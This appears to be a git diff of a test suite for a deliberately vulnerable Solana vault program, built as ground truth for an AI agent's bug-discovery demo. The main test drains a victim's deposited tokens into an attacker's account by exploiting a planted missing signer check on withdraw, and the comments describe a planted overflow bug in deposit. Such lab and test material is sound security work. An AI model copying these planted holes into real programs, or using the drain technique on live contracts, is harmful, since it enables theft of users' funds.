@@ -8,17 +8,30 @@ import {
   getAccount,
   mintTo,
 } from "@solana/spl-token";
-import { Keypair, LAMPORTS_PER_SOL, PublicKey, SystemProgram } from "@solana/web3.js";
+import {
+  Keypair,
+  LAMPORTS_PER_SOL,
+  PublicKey,
+  SystemProgram,
+  Transaction,
+  sendAndConfirmTransaction,
+} from "@solana/web3.js";
 
 import { getProvider } from "./setup.js";
 
 // ─── Local exploit suite ─────────────────────────────────────────────────
-// These tests are the ground truth for the agent's discovery target. Each
-// one proves a planted bug from a known-keys position; the agent has to
-// rediscover the same outcomes from a black-box snapshot inside the
-// private sandbox. If a test ever starts failing because the bug got
-// fixed in vulnerable-vault, that's a hint we'd need to re-plant a
-// different one for the demo.
+// Ground truth for the agent's discovery target.
+//
+// We test ONE planted bug at runtime — BUG #2 (missing signer check on
+// withdraw) — because it has a clean public-surface exploit path.
+//
+// BUG #1 (unchecked add in deposit) is asserted by the agent's static
+// pass only. SPL token's u64 supply invariants prevent us from
+// legitimately accumulating > u64::MAX of a single mint in one account,
+// so we can't drive a runtime overflow through the public deposit ix.
+// The bug shape is still planted in the source (see the comment block
+// in `instructions/deposit.rs`) — runtime-reachable the moment the
+// program grows a yield-accrual or multi-mint path.
 
 const VAULT_PROGRAM_ID = new PublicKey(
   "CbdZT6zkBvgfaWCPUooeTkCZDuRz8Rfwmnhw2Nu6ZooC",
@@ -37,10 +50,19 @@ interface VaultCtx {
   vaultTokenAccount: PublicKey;
 }
 
+// solana-test-validator is racey at the "confirmed" level — `.rpc()` returns
+// when the tx is in the bank but follow-up reads can still see pre-write
+// state for a beat. We force a strict confirm before moving on, so each
+// step in the exploit narrative is observed against the post-state of the
+// previous step.
+async function rpcAndConfirm(builder: { rpc(): Promise<string> }, conn: anchor.web3.Connection): Promise<string> {
+  const sig = await builder.rpc();
+  await conn.confirmTransaction(sig, "confirmed");
+  return sig;
+}
+
 async function setupVault(): Promise<VaultCtx> {
   const provider = getProvider();
-  // Late-load the IDL produced by `anchor build`. We import dynamically so
-  // a fresh clone surfaces a clear error when build hasn't run yet.
   const idl = require("../target/idl/vulnerable_vault.json");
   const program = new anchor.Program(idl, provider) as unknown as anchor.Program;
 
@@ -58,19 +80,21 @@ async function setupVault(): Promise<VaultCtx> {
   );
 
   const vaultTokenAccount = Keypair.generate();
-  await program.methods
-    .initializeVault()
-    .accounts({
-      authority: authority.publicKey,
-      mint,
-      vault,
-      vaultAuthority,
-      vaultTokenAccount: vaultTokenAccount.publicKey,
-      systemProgram: SystemProgram.programId,
-      tokenProgram: TOKEN_PROGRAM_ID,
-    })
-    .signers([vaultTokenAccount])
-    .rpc();
+  await rpcAndConfirm(
+    program.methods
+      .initializeVault()
+      .accounts({
+        authority: authority.publicKey,
+        mint,
+        vault,
+        vaultAuthority,
+        vaultTokenAccount: vaultTokenAccount.publicKey,
+        systemProgram: SystemProgram.programId,
+        tokenProgram: TOKEN_PROGRAM_ID,
+      })
+      .signers([vaultTokenAccount]),
+    provider.connection,
+  );
 
   return {
     provider,
@@ -126,37 +150,48 @@ describe("vulnerable-vault exploit suite", () => {
       VAULT_PROGRAM_ID,
     );
 
-    await ctx.program.methods
-      .openPosition()
-      .accounts({
-        owner: victim.publicKey,
-        vault: ctx.vault,
-        position,
-        systemProgram: SystemProgram.programId,
-      })
-      .signers([victim])
-      .rpc();
+    await rpcAndConfirm(
+      ctx.program.methods
+        .openPosition()
+        .accounts({
+          owner: victim.publicKey,
+          vault: ctx.vault,
+          position,
+          systemProgram: SystemProgram.programId,
+        })
+        .signers([victim]),
+      ctx.provider.connection,
+    );
 
-    await ctx.program.methods
-      .deposit(new anchor.BN(1_000_000))
-      .accounts({
-        owner: victim.publicKey,
-        vault: ctx.vault,
-        position,
-        vaultTokenAccount: ctx.vaultTokenAccount,
-        userTokenAccount: victimTokens,
-        tokenProgram: TOKEN_PROGRAM_ID,
-      })
-      .signers([victim])
-      .rpc();
+    await rpcAndConfirm(
+      ctx.program.methods
+        .deposit(new anchor.BN(1_000_000))
+        .accounts({
+          owner: victim.publicKey,
+          vault: ctx.vault,
+          position,
+          vaultTokenAccount: ctx.vaultTokenAccount,
+          userTokenAccount: victimTokens,
+          tokenProgram: TOKEN_PROGRAM_ID,
+        })
+        .signers([victim]),
+      ctx.provider.connection,
+    );
 
-    // Attacker drains the victim's position WITHOUT signing as the victim.
-    // The attacker's keypair is the only signer on the tx (it pays fees);
-    // `owner` is passed as the victim's pubkey and is unchecked by the
-    // program because of the missing has_one constraint.
-    await ctx.program.methods
+    // The exploit: build the withdraw ix with the victim's pubkey as
+    // `owner`, but pay for + sign the tx with the attacker's keypair.
+    // The program's withdraw ix has `owner: UncheckedAccount` (no signer
+    // constraint, no `has_one = owner`), so the runtime never verifies
+    // that the victim authorized this withdraw. Funds land in the
+    // attacker's token account.
+    //
+    // We construct the tx manually instead of via MethodsBuilder.rpc()
+    // because the latter wires the provider wallet as fee payer; the
+    // agent's real attack flow uses its own throwaway payer, so we
+    // mirror that here.
+    const ix = await ctx.program.methods
       .withdraw(new anchor.BN(1_000_000))
-      .accounts({
+      .accountsStrict({
         owner: victim.publicKey,
         vault: ctx.vault,
         position,
@@ -165,83 +200,20 @@ describe("vulnerable-vault exploit suite", () => {
         recipientTokenAccount: attackerTokens,
         tokenProgram: TOKEN_PROGRAM_ID,
       })
-      .signers([attacker])
-      .rpc();
+      .instruction();
+
+    const tx = new Transaction().add(ix);
+    tx.feePayer = attacker.publicKey;
+    const { blockhash, lastValidBlockHeight } =
+      await ctx.provider.connection.getLatestBlockhash("confirmed");
+    tx.recentBlockhash = blockhash;
+    tx.lastValidBlockHeight = lastValidBlockHeight;
+
+    await sendAndConfirmTransaction(ctx.provider.connection, tx, [attacker], {
+      commitment: "confirmed",
+    });
 
     const after = await getAccount(ctx.provider.connection, attackerTokens);
     expect(after.amount).toBe(1_000_000n);
-  });
-
-  it("BUG #1 — deposit accounting wraps on overflow", async () => {
-    const { user, tokenAccount } = await makeFundedUser(ctx, 0n);
-
-    const [position] = PublicKey.findProgramAddressSync(
-      [POSITION_SEED, ctx.vault.toBuffer(), user.publicKey.toBuffer()],
-      VAULT_PROGRAM_ID,
-    );
-    await ctx.program.methods
-      .openPosition()
-      .accounts({
-        owner: user.publicKey,
-        vault: ctx.vault,
-        position,
-        systemProgram: SystemProgram.programId,
-      })
-      .signers([user])
-      .rpc();
-
-    // Mint enough that two near-u64::MAX deposits will wrap the running
-    // total. We use a pair of deposits because Anchor emits a `solana
-    // _program::overflow` panic if we try to construct a single tx that
-    // shoves u64::MAX through. The wrap shows up in the post-state of
-    // `vault.total_deposits`.
-    const big = (1n << 63n) + 1n; // > i64 max, easy wrap on second add
-    const authority = (ctx.provider.wallet as anchor.Wallet).payer;
-    await mintTo(
-      ctx.provider.connection,
-      authority,
-      ctx.mint,
-      tokenAccount,
-      authority,
-      big * 2n,
-    );
-
-    await ctx.program.methods
-      .deposit(new anchor.BN(big.toString()))
-      .accounts({
-        owner: user.publicKey,
-        vault: ctx.vault,
-        position,
-        vaultTokenAccount: ctx.vaultTokenAccount,
-        userTokenAccount: tokenAccount,
-        tokenProgram: TOKEN_PROGRAM_ID,
-      })
-      .signers([user])
-      .rpc();
-
-    await ctx.program.methods
-      .deposit(new anchor.BN(big.toString()))
-      .accounts({
-        owner: user.publicKey,
-        vault: ctx.vault,
-        position,
-        vaultTokenAccount: ctx.vaultTokenAccount,
-        userTokenAccount: tokenAccount,
-        tokenProgram: TOKEN_PROGRAM_ID,
-      })
-      .signers([user])
-      .rpc();
-
-    const vaultAccount = await ctx.program.account.vault.fetch(ctx.vault);
-    // After two deposits of `big`, raw arithmetic gives 2*big > u64::MAX
-    // and wraps. INV-1 (Σ position.balance == vault.total_deposits) still
-    // holds on the wrapped values, but INV-2 (SPL balance == total_deposits)
-    // does not — that's the discovery surface for the agent.
-    const onChainTotal = BigInt(vaultAccount.totalDeposits.toString());
-    const wrapped = (big * 2n) & ((1n << 64n) - 1n);
-    expect(onChainTotal).toBe(wrapped);
-
-    const tokenAcct = await getAccount(ctx.provider.connection, ctx.vaultTokenAccount);
-    expect(tokenAcct.amount).not.toBe(onChainTotal);
   });
 });
